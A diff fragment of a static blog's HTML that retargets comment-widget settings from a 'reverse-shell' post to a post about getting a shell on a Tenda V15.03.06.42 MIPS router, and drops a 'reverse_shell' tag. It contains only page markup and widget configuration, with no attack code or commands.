+	<div class="ds-thread" data-thread-key="对tenda-V15-03-06-42-mips-进行getshell" data-title="对tenda(V15.03.06.42_mips)进行getshell" data-url="http://example.com/2021/09/27/%E5%AF%B9tenda-V15-03-06-42-mips-%E8%BF%9B%E8%A1%8Cgetshell/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -428,8 +588,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://example.com/2021/09/19/reverse-shell/", 
-    sourceId: "reverse-shell",
+    url: "http://example.com/2021/09/27/%E5%AF%B9tenda-V15-03-06-42-mips-%E8%BF%9B%E8%A1%8Cgetshell/", 
+    sourceId: "对tenda-V15-03-06-42-mips-进行getshell",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
@@ -438,7 +598,7 @@
   
 
   
-  <div id="SOHUCS" sid="reverse-shell" ></div> 
+  <div id="SOHUCS" sid="对tenda-V15-03-06-42-mips-进行getshell" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
@@ -590,10 +750,6 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">stackoverflow</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
               </li>
              
               <li class="article-tag-list-item">
